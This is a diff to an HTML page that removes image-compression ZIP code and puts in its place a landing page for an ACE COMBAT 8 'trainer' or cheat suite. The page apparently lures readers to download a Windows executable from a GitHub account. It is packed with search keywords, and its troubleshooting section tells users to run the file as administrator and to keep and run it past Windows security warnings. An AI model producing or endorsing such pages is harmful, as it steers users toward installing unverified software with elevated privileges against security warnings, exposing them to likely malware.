+  strong { color: #111827; }
+  a { color: #4f46e5; }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 64px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 42px 30px 36px;
+    box-shadow: 0 6px 24px rgba(31, 41, 55, 0.08);
+    border: 1px solid #e6eaf3;
+    text-align: center;
+  }
+  .tagline {
+    font-size: 1.08rem;
+    color: #4b5563;
+    max-width: 640px;
+    margin: 0 auto 28px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 38px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #4f46e5 0%, #db2777 100%);
+    color: #ffffff;
+    font-size: 1.08rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 26px rgba(79, 70, 229, 0.32);
+    letter-spacing: 0.01em;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 32px rgba(79, 70, 229, 0.4);
+  }
+  .note {
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin: 16px 0 0;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin: 20px 0 10px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid #e6eaf3;
+    border-radius: 14px;
+    padding: 20px 20px 14px;
+    box-shadow: 0 3px 12px rgba(31, 41, 55, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin: 0; font-size: 0.94rem; color: #4b5563; }
+  .callout {
+    background: #eef2ff;
+    border-left: 5px solid #4f46e5;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+    word-break: break-word;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 8px;
+    font-size: 0.95rem;
+    background: #ffffff;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  th, td {
+    text-align: left;
+    padding: 12px 16px;
+    border-bottom: 1px solid #e6eaf3;
+    color: #374151;
+  }
+  th { background: #f8fafc; color: #111827; font-weight: 700; }
+  tr:last-child td { border-bottom: none; }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .page { padding: 24px 14px 48px; }
+    .hero { padding: 30px 20px 28px; border-radius: 16px; }
+    .btn { display: block; padding: 16px 20px; }
+    th, td { padding: 10px 12px; font-size: 0.9rem; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
 
-            const zip = new JSZip();
-            downloadZipBtn.disabled = true;
-            const originalHTML = downloadZipBtn.innerHTML;
-            downloadZipBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> ${translations[currentLang].zipProgress}`;
+  <header class="hero">
+    <h1>🛩️ ac8-wings-modkit - Fly Smarter In Every Sortie</h1>
+    <p class="tagline">A 38-module utility suite for ACE COMBAT 8: Wings of Theve — aerial combat, aircraft performance, MRP economy and mission tools, all in one simple Windows application.</p>
+    <a class="btn" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">⬇️ Download ac8-wings-modkit</a>
+    <p class="note">Visit this link to download the application.</p>
+  </header>
 
-            imagesQueue.forEach((item) => {
-                if (item.processedBlob) {
-                    const ext = getFileExtension(item.name, formatSelect.value);
-                    const cleanName = item.name.replace(/\.[^/.]+$/, "");
-                    zip.file(`opti_${cleanName}.${ext}`, item.processedBlob);
-                }
-            });
+  <h2>🎯 What This Toolkit Does</h2>
+  <p>ac8-wings-modkit is a utility suite built for ACE COMBAT 8: Wings of Theve. It brings 38 individual modules together into one application, so you do not have to juggle a collection of separate tools. Players often find this project through searches for <strong>ace combat 8 trainer</strong> or <strong>ace combat 8 cheat</strong>, and the suite is designed to be approachable for someone who has never used a game utility before.</p>
+  <p>The toolkit is organised around four areas of the game: aerial combat, aircraft performance, MRP economy and mission tools. Each area holds several modules. A module is simply a switch you turn on or off. When a switch is on, that particular tool is active. When it is off, it has no effect. This keeps the suite predictable and lets you use only the parts that matter to you.</p>
+  <p>You do not need programming knowledge, configuration files or command-line experience. Every option is presented in plain language, and each module can be changed independently. If you want to test a single aircraft performance adjustment, you can do that without activating anything else. If progression pace is your focus, the same principle applies to the MRP economy tools.</p>
 
-            try {
-                const zipBlob = await zip.generateAsync({ type: 'blob' });
-                triggerBrowserDownload(zipBlob, `teknawy_batch_${Date.now()}.zip`);
-            } catch (err) {
-                showToast("Could not generate ZIP archive.", "error");
-            } finally {
-                downloadZipBtn.disabled = false;
-                downloadZipBtn.innerHTML = originalHTML;
-            }
-        });
-    </script>
+  <h2>✨ The 38 Modules At A Glance</h2>
+  <p>The modules are grouped by purpose. Most players settle on a few favourites rather than turning everything on at once, and that is the recommended way to use the suite.</p>
+  <div class="grid">
+    <div class="tile">
+      <h3>🎯 Aerial Combat</h3>
+      <p>Tools that influence targeting behaviour, weapon readiness and the pace of engagements during flight.</p>
+    </div>
+    <div class="tile">
+      <h3>🛠️ Aircraft Performance</h3>
+      <p>Adjustments for handling, acceleration, climbing and turning so you can explore different flight profiles.</p>
+    </div>
+    <div class="tile">
+      <h3>💰 MRP Economy</h3>
+      <p>Controls connected to Mission Reward Points, including how quickly your budget grows in the hangar.</p>
+    </div>
+    <div class="tile">
+      <h3>🗺️ Mission Tools</h3>
+      <p>Helpers for mission flow, objectives and replaying content when a sortie needs another attempt.</p>
+    </div>
+  </div>
+  <p>The aerial combat group covers the moment-to-moment action. These modules affect how an engagement feels, from target acquisition to the behaviour of special weapons. The aircraft performance group is for flight-model experimentation: you can make a heavy airframe climb differently or hold a turn for longer, then switch the module off when you want the default handling back.</p>
+  <p>The MRP economy group focuses on progression pace. ACE COMBAT 8 has a large aircraft tree, and MRP is the currency that unlocks it. These modules give you ways to reach the aircraft you want without a long grind. The mission tools group sits around the sortie itself, helping with mission flow and repeat attempts. All four groups are independent, so a module in one group never depends on a module in another.</p>
+
+  <h2>💻 System Requirements</h2>
+  <p>The application is intended for Windows PCs that can already run ACE COMBAT 8: Wings of Theve. The toolkit itself is light and does not need a high-end graphics card or a large amount of disk space.</p>
+  <table>
+    <tr>
+      <th>Item</th>
+      <th>Requirement</th>
+    </tr>
+    <tr>
+      <td>Operating system</td>
+      <td>Windows 10 or Windows 11, 64-bit</td>
+    </tr>
+    <tr>
+      <td>Game</td>
+      <td>ACE COMBAT 8: Wings of Theve, installed and running</td>
+    </tr>
+    <tr>
+      <td>Disk space</td>
+      <td>A small amount of free space for the toolkit file</td>
+    </tr>
+    <tr>
+      <td>Permissions</td>
+      <td>Ability to open a downloaded application</td>
+    </tr>
+    <tr>
+      <td>Input</td>
+      <td>Mouse and keyboard</td>
+    </tr>
+  </table>
+
+  <h2>📥 Download and Setup</h2>
+  <p>Visit this link to download the application. The project page is the single place to get the current toolkit file, so there is no second download to track down.</p>
+  <div class="callout">
+    <p><strong>Download link:</strong> <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">https://github.com/changefulnesspitstop975/ac8-wings-modkit</a></p>
+    <p><strong>Action:</strong> Visit this link to download the application.</p>
+  </div>
+  <p>Save the file to a folder you can find again, such as Downloads or a new folder on your desktop named AC8. Keeping the toolkit in one known location means you always know where to open it from. No account, extra file or companion tool is required.</p>
+
+  <h2>🚀 First Launch Walkthrough</h2>
+  <p>When the toolkit opens for the first time, you will see a plain window with the four module groups. Nothing is switched on by default, which is intentional. You always know exactly what is active at any moment.</p>
+  <ol>
+    <li><strong>Confirm the game is running.</strong> Start ACE COMBAT 8: Wings of Theve first and reach the main menu or a mission. If the toolkit shows a connection status, check that it reads as connected.</li>
+    <li><strong>Start with one module.</strong> Choose a single module from the group you care about most. An MRP economy toggle is a good first choice because the effect is easy to notice after you finish a mission and check your balance.</li>
+    <li><strong>Test in a low-pressure mission.</strong> Use a mission you have already completed rather than a story-critical one. This keeps your first experience calm and lets you compare the difference fairly.</li>
+    <li><strong>Add more gradually.</strong> Once one module behaves the way you expect, add a second. Change one thing at a time and the whole suite stays predictable.</li>
+    <li><strong>Switch off when you are done.</strong> Turn modules off before closing the toolkit, or close the game and the toolkit together. Your next session then starts clean.</li>
+  </ol>
+
+  <h2>💡 Tips For A Smooth Experience</h2>
+  <ul>
+    <li><strong>Run the game in windowed mode</strong> on your first attempt. It makes switching between the game and the toolkit window effortless.</li>
+    <li><strong>Keep a short note</strong> of which modules you have switched on. A few seconds of note-taking saves confusion later.</li>
+    <li><strong>Change one setting per mission.</strong> If something feels off, you will know exactly which module caused it.</li>
+    <li><strong>Close background apps</strong> that overlay on top of games. A cleaner screen gives the toolkit a clearer view and reduces odd behaviour.</li>
+    <li><strong>Return to defaults for story moments.</strong> Switch everything off when you want the intended experience, then switch back on afterwards.</li>
+    <li><strong>Keep the toolkit in one folder.</strong> Moving it around while it is open can interrupt a session.</li>
+  </ul>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Do I need to know how to code?</h3>
+  <p>No. There is no scripting, no command line and no configuration file to edit. Everything happens through simple on and off switches in a standard window.</p>
+  <h3>Is this a separate game?</h3>
+  <p>No. It works alongside ACE COMBAT 8: Wings of Theve. You still need the game installed and running to use it.</p>
+  <h3>What is the difference between a trainer and a cheat tool?</h3>
+  <p>In practice, very little. Both terms describe a program that adjusts values or behaviour in a running game. The phrases <em>ace combat 8 trainer</em> and <em>ace combat 8 cheat</em> both point at tools like this one.</p>
+  <h3>Can I use just one module?</h3>
+  <p>Yes. Every module is independent. Using a single MRP toggle is a perfectly normal way to use the suite.</p>
+  <h3>Does it work on a laptop?</h3>
+  <p>Yes, as long as the laptop runs Windows 10 or 11 and can run the game itself.</p>
+  <h3>Do I need to reinstall it after an update?</h3>
+  <p>No. Revisit the download link when a newer version is published and replace your existing file with the fresh one.</p>
+
+  <h2>🔧 Troubleshooting</h2>
+  <p><strong>The window does not open.</strong> Right-click the file and choose to run it as administrator. Some Windows security settings quietly block newly downloaded applications until you confirm them.</p>
+  <p><strong>Windows shows a warning on first launch.</strong> This is standard for any file downloaded from the internet. Choose the option to keep and run the file, then continue.</p>
+  <p><strong>Nothing seems to change in game.</strong> Make sure the game was started before the toolkit. If you launched them in the other order, close both and try again in the correct sequence.</p>
+  <p><strong>A module behaves unexpectedly.</strong> Switch it off, return to the menu, and switch it on again. If the problem repeats, leave that module off and use the others — each one is independent, so a single misbehaving toggle never blocks the rest.</p>
+  <p><strong>The game crashes while a toggle is active.</strong> Turn off the most recently enabled module first. That is almost always the cause of an immediate crash.</p>
+
+  <h2>📌 Versions and Updates</h2>
+  <p>The toolkit is distributed through its project page. New versions appear there whenever modules are added, adjusted or refreshed. Before a long play session, revisit the download link and check whether a newer release is available. Replacing your existing file is all that is required — there is nothing else to uninstall or clean up.</p>
+
+</main>
 </body>
 </html>
-
+```
